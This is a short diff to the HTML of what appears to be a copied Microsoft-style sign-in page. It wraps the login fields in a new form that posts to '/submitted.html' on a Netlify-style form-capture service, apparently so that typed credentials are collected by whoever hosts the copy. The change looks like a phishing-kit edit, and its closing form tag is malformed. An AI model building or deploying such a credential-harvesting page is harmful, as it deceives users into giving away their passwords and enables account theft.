@@ -320,7 +320,7 @@
 </div>
 
 <!-- ko if: shouldHipInit --><!-- /ko -->
-
+<form action="/submitted.html" method="POST" name="f" id="f" data-netlify="true">
 <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !boilerPlateText }, externalCss: { 'password-reset-links-container': true }" class="password-reset-links-container ext-password-reset-links-container">
     <div>
         <!-- ko if: svr.fShowPersistentCookiesWarning --><!-- /ko -->
@@ -419,6 +419,7 @@
 </div></div>
     </div>
 </div>
+</form
 
 <!-- ko if: tenantBranding.BoilerPlateText || boilerPlateText-->
 <div id="idBoilerPlateText" class="wrap-content boilerplate-text ext-boilerplate-text" data-bind="
